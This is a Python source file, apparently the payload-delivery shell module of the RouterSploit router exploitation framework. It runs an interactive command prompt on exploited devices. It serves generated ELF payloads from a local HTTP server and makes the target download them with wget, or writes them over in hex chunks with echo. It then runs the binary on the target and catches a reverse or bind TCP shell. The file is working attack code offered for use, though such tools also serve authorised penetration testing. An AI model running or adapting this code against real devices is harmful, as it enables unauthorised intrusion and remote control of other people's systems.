import socket
import telnetlib
import SimpleHTTPServer
import BaseHTTPServer
import threading
import time
from os import listdir
from os.path import isfile, join
import importlib

from printer import printer_queue
from routersploit import validators

from routersploit.utils import (
    print_info,
    print_error,
    print_success,
    print_status,
    print_table,
    random_text,
)


def shell(exploit, architecture="", method="", **params):
    path = "routersploit/modules/payloads/{}/".format(architecture)
    payload = None
    options = []

    while 1:
        while not printer_queue.empty():
            pass

        if payload is None:
            cmd_str = "cmd > "
        else:
            cmd_str = "cmd (\033[92m{}\033[0m) > ".format(payload._Exploit__info__['name'])

        cmd = raw_input(cmd_str)

        if cmd in ["quit", "exit"]:
            return

        elif cmd == "show payloads":
            payloads = [f.split(".")[0] for f in listdir(path) if isfile(join(path, f)) and f.endswith(".py") and f != "__init__.py"]

            print_info("Available payloads:")
            for payload_name in payloads:
                print_info("- {}".format(payload_name))

        elif cmd.startswith("set payload "):
            c = cmd.split(" ")

            payload_path = path.replace("/", ".") + c[2]
            payload = getattr(importlib.import_module(payload_path), 'Exploit')()

            options = []
            for option in payload.exploit_attributes.keys():
                if option not in ["output", "filepath"]:
                    options.append([option, getattr(payload, option), payload.exploit_attributes[option]])

            if payload.handler == "bind_tcp":
                options.append(["rhost", validators.ipv4(exploit.target), "Remote IP"])

                if method == "wget":
                    options.append(["lhost", "", ""])
                    options.append(["lport", 4545, ""])

        elif payload is not None:
            if cmd == "show options":
                headers = ("Name", "Current settings", "Description")

                print_info('\nPayload Options:')
                print_table(headers, *options)
                print_info()

            elif cmd.startswith("set "):
                c = cmd.split(" ")
                if len(c) != 3:
                    print_error("set <option> <value>")
                else:
                    for option in options:
                        if option[0] == c[1]:
                            print_success("{'" + c[1] + "': '" + c[2] + "'}")
                            option[1] = c[2]
                            setattr(payload, c[1], c[2])

            elif cmd == "run":
                exec_binary_str = ""
                data = payload.generate()

                if method == "wget":
                    elf_binary = payload.generate_elf(data)
                    communication = Communication(exploit, elf_binary, options, **params)
                    communication.wget()
                elif method == "echo":
                    elf_binary = payload.generate_elf(data)
                    communication = Communication(exploit, elf_binary, options, **params)
                    communication.echo()
                elif method == "generic":
                    exec_binary_str = data

                if payload.handler == "bind_tcp":
                    communication.bind_tcp(exec_binary_str)
                elif payload.handler == "reverse_tcp":
                    communication.reverse_tcp(exec_binary_str)
        else:
            exploit.execute(cmd)


class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        self.wfile.write(self.server.content)
        self.server.stop = True

    def log_message(self, format, *args):
        return


class HttpServer(BaseHTTPServer.HTTPServer):
    def serve_forever(self, content):
        self.stop = False
        self.content = content
        while not self.stop:
            self.handle_request()


class Communication(object):
    def __init__(self, exploit, payload, options, location, binary="", shell=""):
        self.exploit = exploit
        self.payload = payload
        self.options = {option[0]: option[1] for option in options}

        self.location = location
        self.binary_name = random_text(8)

        self.binary = binary
        self.shell = shell

    def http_server(self, lhost, lport):
        print_status("Setting up HTTP server")
        server = HttpServer((lhost, int(lport)), HttpRequestHandler)

        server.serve_forever(self.payload)
        server.server_close()

    def wget(self):
        print_status("Using wget method")

        # run http server
        thread = threading.Thread(target=self.http_server, args=(self.options['lhost'], self.options['lport']))
        thread.start()

        # wget binary
        print_status("Using wget to download binary")
        cmd = "{} http://{}:{}/{} -O {}/{}".format(self.binary,
                                                   self.options['lhost'],
                                                   self.options['lport'],
                                                   self.binary_name,
                                                   self.location,
                                                   self.binary_name)

        self.exploit.execute(cmd)

    def echo(self):
        print_status("Using echo method")

        path = "{}/{}".format(self.location, self.binary_name)

        size = len(self.payload)
        num_parts = (size / 30) + 1

        # transfer binary through echo command
        print_status("Using echo method to transfer binary")
        for i in range(0, num_parts):
            current = i * 30
            print_status("Transferring {}/{} bytes".format(current, len(self.payload)))

            block = self.payload[current:current + 30].encode('hex')
            block = "\\x" + "\\x".join(a + b for a, b in zip(block[::2], block[1::2]))
            cmd = 'echo -ne {} >> {}'.format(block, path)
            self.exploit.execute(cmd)

    def build_exec_binary_str(self, location, binary_name):
        path = "{}/{}".format(location, binary_name)
        exec_binary_str = "chmod 777 {}; {}; rm {}".format(path, path, path)
        return exec_binary_str

    def listen(self, lhost, lport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost, int(lport)))
        sock.listen(5)
        return sock

    def reverse_tcp(self, exec_binary_str=""):
        sock = self.listen(self.options['lhost'], self.options['lport'])

        if not exec_binary_str:
            exec_binary_str = self.build_exec_binary_str(self.location, self.binary_name)

        thread = threading.Thread(target=self.exploit.execute, args=(exec_binary_str,))
        thread.start()

        # waiting for shell
        print_status("Waiting for reverse shell...")
        client, addr = sock.accept()
        sock.close()
        print_status("Connection from {}:{}".format(addr[0], addr[1]))

        print_success("Enjoy your shell")
        t = telnetlib.Telnet()
        t.sock = client
        t.interact()

    def bind_tcp(self, exec_binary_str=""):
        if not exec_binary_str:
            exec_binary_str = self.build_exec_binary_str(self.location, self.binary_name)

        thread = threading.Thread(target=self.exploit.execute, args=(exec_binary_str,))
        thread.start()

        # connecting to shell
        print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
        time.sleep(2)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.options['rhost'], self.options['rport']))

        print_success("Enjoy your shell")
        tn = telnetlib.Telnet()
        tn.sock = sock
        tn.interact()
